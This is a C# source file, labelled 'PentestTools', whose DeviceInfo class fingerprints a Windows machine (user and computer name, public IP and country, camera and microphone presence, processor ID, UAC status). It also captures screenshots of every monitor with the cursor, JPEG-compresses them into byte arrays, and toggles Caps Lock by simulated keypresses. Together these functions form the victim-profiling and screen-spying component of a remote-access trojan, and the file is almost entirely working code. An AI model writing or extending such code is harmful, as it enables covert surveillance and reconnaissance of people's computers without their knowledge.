using AForge.Video.DirectShow;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PentestTools
{
    public static class DeviceInfo
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CURSORINFO
        {
            public int cbSize;
            public int flags;
            public IntPtr hCursor;
            public POINT ptScreenPos;
        }

        public const int CURSOR_SHOWING = 0x00000001;
        public const int DI_NORMAL = 0x0003;

        [DllImport("user32.dll")]
        public static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon,
            int cxWidth, int cyWidth, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        private const uint KEYEVENTF_EXTENDEDKEY = 0x0001;
        private const uint KEYEVENTF_KEYUP = 0x0002;
        private const ushort VK_CAPITAL = 0x14;


        public static string GetUsername() => Environment.UserName;

        public static string GetComputerName() => Environment.MachineName;

        public static async Task<string> GetLocalIP()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    return await client.GetStringAsync("https://api.ipify.org");
                }
            }
            catch
            {
                return "Unable to retrieve IP";
            }
        }

        public static string GetOSInfo() => Environment.OSVersion.ToString();

        public static async Task<string> GetCountryAsync()
        {
            try
            {
                using HttpClient client = new HttpClient();
                string json = await client.GetStringAsync("http://ip-api.com/json/");
                var obj = JsonSerializer.Deserialize<JsonElement>(json);
                return obj.GetProperty("country").GetString();
            }
            catch
            {
                return "Agartha"; // real mature of me
            }
        }

        public static string IsCameraAvailable()
        {
            try
            {
                return new FilterInfoCollection(FilterCategory.VideoInputDevice).Count > 0 ? "Yes" : "No";
            }
            catch
            {
                return "No";
            }
        }

        public static string IsMicAvailable()
        {
            try
            {
                return new FilterInfoCollection(FilterCategory.AudioInputDevice).Count > 0 ? "Yes" : "No";
            }
            catch
            {
                return "No";
            }
        }

        public static string GetHWID()
        {
            try
            {
                using var mc = new ManagementClass("Win32_Processor");
                foreach (ManagementObject mo in mc.GetInstances())
                {
                    return mo.Properties["ProcessorId"].Value.ToString();
                }
            }
            catch { }
            return "N/A";
        }

        public static string GetCPUInfo()
        {
            try
            {
                using var searcher = new ManagementObjectSearcher("select Name from Win32_Processor");
                foreach (var item in searcher.Get())
                {
                    return item["Name"].ToString();
                }
            }
            catch { }
            return "N/A";
        }

        public static string GetGPUInfo()
        {
            try
            {
                using var searcher = new ManagementObjectSearcher("select Name from Win32_VideoController");
                foreach (var item in searcher.Get())
                {
                    return item["Name"].ToString();
                }
            }
            catch { }
            return "N/A";
        }

        public static string GetUACStatus()
        {
            try
            {
                using RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                var value = key?.GetValue("EnableLUA");
                return (value != null && (int)value == 1) ? "Enabled" : "Disabled";
            }
            catch { }
            return "Unknown";
        }

        public static List<Screen> GetAllMonitors()
        {
            return Screen.AllScreens.ToList();
        }

        public static Bitmap CaptureAllScreens()
        {
            try
            {
                Rectangle bounds = SystemInformation.VirtualScreen;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);

                using Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                return bitmap;
            }
            catch
            {
                return null;
            }
        }

        public static Bitmap CaptureAllScreensWithCursor()
        {
            try
            {
                Rectangle bounds = SystemInformation.VirtualScreen;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);

                using Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);

                CURSORINFO ci = new CURSORINFO();
                ci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

                if (GetCursorInfo(out ci) && ci.flags == CURSOR_SHOWING)
                {
                    int cursorX = ci.ptScreenPos.x - bounds.Left;
                    int cursorY = ci.ptScreenPos.y - bounds.Top;
                    DrawIconEx(g.GetHdc(), cursorX, cursorY, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                    g.ReleaseHdc();
                }

                return bitmap;
            }
            catch
            {
                return null;
            }
        }

        public static byte[] CaptureAll()
        {
            try
            {
                Bitmap bitmap = CaptureAllScreensWithCursor();
                if (bitmap == null)
                    return null;

                using MemoryStream ms = new MemoryStream();
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                bitmap.Dispose();
                return ms.ToArray();
            }
            catch
            {
                return null;
            }
        }

        public static byte[] CaptureMonitor(Screen screen, bool includeCursor = true)
        {
            try
            {
                Rectangle bounds = screen.Bounds;
                using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                using Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

                if (includeCursor)
                {
                    CURSORINFO ci = new CURSORINFO();
                    ci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

                    if (GetCursorInfo(out ci) && ci.flags == CURSOR_SHOWING)
                    {
                        int cursorX = ci.ptScreenPos.x - bounds.Left;
                        int cursorY = ci.ptScreenPos.y - bounds.Top;
                        DrawIconEx(g.GetHdc(), cursorX, cursorY, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                        g.ReleaseHdc();
                    }
                }

                using MemoryStream ms = new MemoryStream();
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                return ms.ToArray();
            }
            catch
            {
                return null;
            }
        }


        public static Bitmap CaptureMonitorWithCursor(Screen screen)
        {
            try
            {
                Rectangle bounds = screen.Bounds;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                using Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

                CURSORINFO ci = new CURSORINFO();
                ci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

                if (GetCursorInfo(out ci) && ci.flags == CURSOR_SHOWING)
                {
                    int cursorX = ci.ptScreenPos.x - bounds.Left;
                    int cursorY = ci.ptScreenPos.y - bounds.Top;
                    DrawIconEx(g.GetHdc(), cursorX, cursorY, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                    g.ReleaseHdc();
                }

                return bitmap;
            }
            catch
            {
                return null;
            }
        }

        public static byte[] Capture(Screen screen, int jpegQuality = 100)
        {
            try
            {
                Bitmap bmp = CaptureMonitorWithCursor(screen);
                if (bmp == null)
                    return null;

                byte[] result = CompressScreenshot(bmp, jpegQuality);
                bmp.Dispose();
                return result;
            }
            catch
            {
                return null;
            }
        }


        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            return ImageCodecInfo.GetImageDecoders().FirstOrDefault(c => c.FormatID == format.Guid);
        }



        public static void DisposeScreenshot(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
            }
            catch
            {
                // ignore exceptions here
            }
        }

        public static void ForceCapsLockOn()
        {
            bool isCapsLockOn = (((ushort)GetKeyState(VK_CAPITAL)) & 0x0001) != 0;
            if (!isCapsLockOn)
            {
                // Simulate key press and release to toggle Caps Lock
                keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY, UIntPtr.Zero);
                keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, UIntPtr.Zero);
            }
        }
        public static void ForceCapsLockOff()
        {
            bool isCapsLockOn = (((ushort)GetKeyState(VK_CAPITAL)) & 0x0001) != 0;
            if (isCapsLockOn)
            {
                // Simulate key press and release to toggle Caps Lock OFF
                keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY, UIntPtr.Zero);
                keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, UIntPtr.Zero);
            }
        }
        public static void ToggleCapsLock()
        {
            // Simulate a Caps Lock key press and release to toggle its state
            keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY, UIntPtr.Zero);
            keybd_event((byte)VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, UIntPtr.Zero);
        }
        public static Bitmap CaptureMonitorBitmap(Screen screen, bool includeCursor = true)
        {
            try
            {
                Rectangle bounds = screen.Bounds;
                Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);

                using (Graphics g = Graphics.FromImage(screenshot))
                {
                    // Capture the screen content
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

                    // Add cursor if requested
                    if (includeCursor)
                    {
                        CURSORINFO ci = new CURSORINFO();
                        ci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

                        if (GetCursorInfo(out ci) && ci.flags == CURSOR_SHOWING)
                        {
                            // Calculate cursor position relative to the monitor bounds
                            int cursorX = ci.ptScreenPos.x - bounds.Left;
                            int cursorY = ci.ptScreenPos.y - bounds.Top;

                            // Only draw cursor if it's within the monitor bounds
                            if (cursorX >= 0 && cursorY >= 0 && cursorX < bounds.Width && cursorY < bounds.Height)
                            {
                                IntPtr hdc = g.GetHdc();
                                DrawIconEx(hdc, cursorX, cursorY, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                                g.ReleaseHdc(hdc);
                            }
                        }
                    }
                }

                return screenshot;
            }
            catch
            {
                return null;
            }
        }
        static byte[] CompressScreenshot(Bitmap bmp, long quality)
        {
            using MemoryStream ms = new();
            var jpegCodec = ImageCodecInfo.GetImageEncoders().First(c => c.MimeType == "image/jpeg");
            var encParams = new EncoderParameters(1);
            encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
            bmp.Save(ms, jpegCodec, encParams);
            return ms.ToArray();
        }
    }
}